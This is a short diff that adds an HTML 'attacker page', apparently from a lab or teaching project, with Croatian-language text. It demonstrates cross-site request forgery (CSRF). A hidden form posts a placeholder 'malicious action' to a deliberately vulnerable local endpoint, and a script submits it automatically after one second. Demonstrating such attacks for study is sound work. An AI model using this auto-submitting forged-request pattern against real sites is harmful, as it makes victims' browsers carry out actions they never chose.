@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Attacker demo — CSRF</title>
+  </head>
+  <body>
+    <h3>Attacker page — CSRF demo</h3>
+    <p>Ova stranica automatski šalje POST na /csrf-vuln </p>
+
+    <form id="attack" action="http://localhost:3000/csrf-vuln" method="POST">
+      <input type="hidden" name="action" value="neka-zlonamjerna-akcija">
+      <input type="hidden" name="vulnerable" value="on">
+    </form>
+
+    <script>
+      setTimeout(() => {
+        document.getElementById('attack').submit();
+      }, 1000);
+    </script>
+  </body>
+</html>
